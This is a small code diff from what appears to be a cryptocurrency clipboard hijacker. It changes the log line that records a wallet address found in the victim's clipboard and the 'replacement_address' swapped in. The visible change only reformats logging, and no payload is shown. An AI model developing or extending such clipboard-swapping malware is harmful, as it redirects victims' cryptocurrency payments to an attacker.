@@ -74,7 +74,7 @@ def sniff(user_clipboard):
 def log(current_time, crypto_found, user_clipboard, replacement_address):
     with open("log.txt", "a+") as log:
         log.write(
-            f"[{current_time}]: {crypto_found.upper()} in clipboard ({user_clipboard}) -> {replacement_address}"
+            f"[{current_time}]: Found: {user_clipboard} ({crypto_found.upper()} address) -> {replacement_address} \n"
         )
 
 
